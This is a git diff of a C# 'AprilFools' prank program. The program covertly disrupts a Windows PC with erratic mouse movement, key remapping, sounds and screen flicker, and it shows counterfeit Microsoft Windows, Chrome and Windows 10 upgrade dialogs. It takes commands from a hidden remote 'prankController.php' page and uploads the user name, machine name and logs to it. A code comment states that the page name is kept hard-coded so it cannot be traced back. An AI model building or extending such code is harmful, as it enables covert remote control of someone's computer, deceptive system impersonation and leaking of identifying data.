@@ -1,4 +1,4 @@
-﻿//#define _TESTING
+﻿#define _TESTING
 
 using System;
 using System.Collections.Generic;
@@ -6,7 +6,6 @@ using System.Linq;
 using System.Media;
 using System.Threading;
 using System.Windows.Forms;
-using System.Web;
 using Generics;
 using System.Reflection;
 
@@ -51,21 +50,49 @@ namespace AprilFools
         private const int _externalControlThreadPollingInterval = 5 * 1000;
         private const int _externalControlThreadPauseAfterFail = 5 * 60 * 1000 - _externalControlThreadPollingInterval;//5 min wait after each failure
 
-        private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
-        private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
-        private static bool _popupThreadRunning = false;//should always run unless all popups are disabled
-        private static bool _eraticMouseRunning = false;
-        private static bool _wanderMouseRunning = false;
-        private static bool _eraticKeyboardThreadRunning = false;
-
         private const int TollerableExceptionCount = 3;
         private static int exceptionCount = 0;
 
-        private static CursorWanderAI cursorWanderID = new CursorWanderAI();
+        //Threads
+        private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
+        private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
+        private static bool _popupThreadRunning = true;//should always run unless all popups are disabled
+        private static bool _eraticMouseRunning = false;
+        private static bool _wanderMouseRunning = false;
+        private static bool _eraticKeyboardThreadRunning = false;
+        private static Thread externalControlThread;
+        private static Thread mouseThread;
+        private static Thread eraticKeyboardThread;
+        private static Thread soundThread;
+        private static Thread popupThread;
 
+        //Control Page info
+        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
+        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
+        private const string NEW_CMD_TAG = "_NEW_";
+        private const char CMD_SEPERATION_TAG = '\n';
+        private const int externalControlPageMaxFailAttempts = 100;
+        private static int externalControlPageFailAttempts = 0;
+        private static int externalControlScheduleDisplayLimit = 15;
+        private static int externalControLogDisplayLimit = 15;
+        private static string ctrlWebPage = null;
+
+        //Session and schedule info
+        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 5 min.</summary>
+        private const int sessionDefaultStartDelay = 5 * 60 * 1000;
+        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
+        private const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
+        private static EventScheduler<PrankerEvent> schedule;
+        private const PrankerSchedule defaultScheduleType = PrankerSchedule.Easy;
+
+        //Sounds
         private static bool _playBombBeepingNow = false;
         private static PrankerSound nextSound = PrankerSound.None;
+
+        //Popups
         private static PrankerPopup nextPopup = PrankerPopup.None;
+        private static ScreenCoverForm screenCoverForm = new ScreenCoverForm();
+        private static Windows10UpgradeForm win10Prompt = new Windows10UpgradeForm();
 
         //Key mapping using assosiative arrays / dictionary
         public static List<Keys> keysToTrack = null;
@@ -76,26 +103,7 @@ namespace AprilFools
         public static bool keyMappingsActive = false;
         public static int KeyMappingMaxDurration = 30 * 60 * 1000;//30 minutes
 
-        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 5 min.</summary>
-        const int sessionDefaultStartDelay = 5 * 60 * 1000;
-        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
-        const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
-        private static EventScheduler<PrankerEvent> schedule;
-        private const PrankerSchedule defaultScheduleType = PrankerSchedule.Easy;
-
-        private static Thread externalControlThread;
-        private static Thread mouseThread;
-        private static Thread eraticKeyboardThread;
-        private static Thread soundThread;
-        private static Thread popupThread;
-
-        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
-        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
-        private const string NEW_CMD_TAG = "_NEW_";
-        private const char CMD_SEPERATION_TAG = '\n';
-        private const int externalControlPageFailMaxAttempts = 100;
-        private static int externalControlPageFailAttempts = 0;
-        private static string ctrlWebPage = null;
+        private static CursorWanderAI cursorWanderID = new CursorWanderAI();
 
         /// <summary>
         /// Entry point for prank application
@@ -126,16 +134,16 @@ namespace AprilFools
             //schedule.AddEvent(PrankerEvent.RunWanderMouse10s, 0);
             //EnableKeyMapping();
             //OpenPopupNow(PrankerPopup.ChromeGPUProcessCrash);
-            schedule.AddEvent(PrankerEvent.PlaySound_Hand3X, 0);
-            
+
+            schedule.AddEvent(PrankerEvent.FlickerScreen0_5_Times, 0);
         }
 
         public static void TestCode2()
         {
             //DisableKeyMapping();
-            //OpenPopupNow(PrankerPopup.ChromeResources);
-            schedule.AddEvent(PrankerEvent.RunEraticMouse10s, 0);
-            schedule.AddEvent(PrankerEvent.PlaySound_Asterisk3X, 0);
+
+            schedule.AddEvent(PrankerEvent.PopupWindows10Upgrade, 0);
+            //schedule.AddEvent(PrankerEvent.FlickerScreen0_10_Times, 0);
         }
         #endregion
 
@@ -158,7 +166,6 @@ namespace AprilFools
             switch (scheduleType)
             {
                 case PrankerSchedule.SuperEasy:
-                    if (_popupThreadRunning) for (int i=1;i<=1;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     plan.Add(PrankerEvent.RunEraticMouse5s);
                     plan.Add(PrankerEvent.RunWanderMouse5s);
                     plan.Add(PrankerEvent.MapNext5Keys);
@@ -166,7 +173,6 @@ namespace AprilFools
                     if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_SuperEasy, sessionDurration);
                     break;
                 case PrankerSchedule.Easy:
-                    if (_popupThreadRunning) for (int i=1;i<=1;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     plan.Add(PrankerEvent.RunEraticMouse5s);
                     plan.Add(PrankerEvent.RunEraticMouse10s);
                     plan.Add(PrankerEvent.RunWanderMouse5s);
@@ -177,7 +183,6 @@ namespace AprilFools
                     break;
                 default:
                 case PrankerSchedule.Medium:
-                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     plan.Add(PrankerEvent.RunEraticMouse5s);
                     plan.Add(PrankerEvent.RunEraticMouse5s);
                     plan.Add(PrankerEvent.RunEraticMouse10s);
@@ -191,7 +196,6 @@ namespace AprilFools
                     if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium, sessionDurration);
                     break;
                 case PrankerSchedule.Medium_SingleKeySwaps:
-                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                     for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                     for (int i=1;i<= 4;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
@@ -200,7 +204,6 @@ namespace AprilFools
                     if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_SingleKeySwaps, sessionDurration);
                     break;
                 case PrankerSchedule.Medium_DoubleKeySwaps:
-                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                     for (int i=1;i<= 2;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                     for (int i=1;i<= 4;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
@@ -210,7 +213,6 @@ namespace AprilFools
                     if (loopSession) schedule.AddEvent(PrankerEvent.CreateSchedule_Medium_DoubleKeySwaps, sessionDurration);
                     break;
                 case PrankerSchedule.Medium_PlusSome://just turned some minor stuff up like move cursor to corner
-                    if (_popupThreadRunning) for (int i=1;i<=2;i++) plan.Add(PrankerEvent.CreateRandomPopup);
                     for (int i=1;i<= 5;i++) plan.Add(PrankerEvent.RunEraticMouse5s);
                     for (int i=1;i<= 3;i++) plan.Add(PrankerEvent.RunEraticMouse10s);
                     for (int i=1;i<= 5;i++) plan.Add(PrankerEvent.RunWanderMouse5s);
@@ -279,7 +281,7 @@ namespace AprilFools
             }
         }
 
-        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, bool inludeLogs=true)
+        private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, int inludeLogs=0, int scheduleDisplayCount=-1)
         {
             //this is temperarily set to always report logs
             if (ctrlWebPage == null)
@@ -290,11 +292,11 @@ namespace AprilFools
 
             if (updateSchedule)
             {
-                pageUrlData += "?upload=Y&uploaddata=" + schedule;
+                pageUrlData += "?upload=Y&uploaddata=" + schedule.GetNextEvents(scheduleDisplayCount); ;
                 if (includeTimeStamp)
                     pageUrlData += "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
-                if (inludeLogs)
-                    pageUrlData += "\n\n " + GenericsClass.GetLogData();
+                if (inludeLogs!=0)
+                    pageUrlData += "\n\n " + GenericsClass.GetLogData(inludeLogs);
             }
             return GenericsClass.DownloadHTML(pageUrl + pageUrlData, null, true);
         }
@@ -364,15 +366,15 @@ namespace AprilFools
 
                 //if schedule changed re-upload current
                 //should always do this to keep page timestamp up to date
-                html = FetchCtrlPage(true,true);
+                html = FetchCtrlPage(true, true, externalControLogDisplayLimit, externalControlScheduleDisplayLimit);
                 if (html != null)
                     externalControlPageFailAttempts = 0; //sucsessfull transactions - read and write
                 else //returned null on second page read (write)
                 {
-                    if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
+                    if (++externalControlPageFailAttempts >= externalControlPageMaxFailAttempts)
                     {
                         _externalControlThreadRunning = false;
-                        GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs ("+GenericsClass.GetLogData().Length+" chars)");
+                        GenericsClass.Log("ReadFromCtrlWebPage() - External control page write timed out after " + externalControlPageFailAttempts + " attempts. " + GenericsClass.GetLogCount() + " logs (" + GenericsClass.GetLogData(externalControLogDisplayLimit).Length + " chars)");
                     }
                     else
                         Thread.Sleep(_externalControlThreadPauseAfterFail);
@@ -380,7 +382,7 @@ namespace AprilFools
             }
             else //returned null on first page read
             {
-                if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
+                if (++externalControlPageFailAttempts >= externalControlPageMaxFailAttempts)
                 {
                     _externalControlThreadRunning = false;
                     GenericsClass.Log("ReadFromCtrlWebPage() - External control page read timed out after " + externalControlPageFailAttempts + " attempts.");
@@ -798,6 +800,9 @@ namespace AprilFools
                                 MessageBox.Show("Your system is running low on resources",
                                     "Microsoft Windows",MessageBoxButtons.OK,MessageBoxIcon.Warning);
                                 break;
+                            case PrankerPopup.Windows10Upgrade:
+                                win10Prompt.ShowDialog();
+                                break;
                         }
                         nextPopup = PrankerPopup.None;//clear till this is called again
                     }
@@ -838,6 +843,7 @@ namespace AprilFools
             ChromeBadDay,
             ChromeGPUProcessCrash,
             WindowsResources,
+            Windows10Upgrade,
         }
         #endregion
 
@@ -1146,6 +1152,17 @@ namespace AprilFools
                     EnableKeyMapping(10);
                     schedule.AddEvent(PrankerEvent.StopMappingAllKeys, KeyMappingMaxDurration, true);
                     break;
+                case PrankerEvent.PopupWindows10Upgrade:
+                    nextPopup = PrankerPopup.Windows10Upgrade;
+                    break;
+                case PrankerEvent.FlickerScreen0_5_Times:
+                    if(nextPopup==PrankerPopup.None)
+                        screenCoverForm.Flicker(5);
+                    break;
+                case PrankerEvent.FlickerScreen0_10_Times:
+                    if (nextPopup == PrankerPopup.None)
+                        screenCoverForm.Flicker(10);
+                    break;
                 case PrankerEvent.CreateSchedule_SuperEasy:
                     CreateSchedule(PrankerSchedule.SuperEasy);
                     break;
@@ -1237,6 +1254,13 @@ namespace AprilFools
 
             //popup events
             CreateRandomPopup,
+
+            //Windows 10 popup
+            PopupWindows10Upgrade,
+
+            //screen flickering
+            FlickerScreen0_5_Times,
+            FlickerScreen0_10_Times,
         }
         #endregion
     }
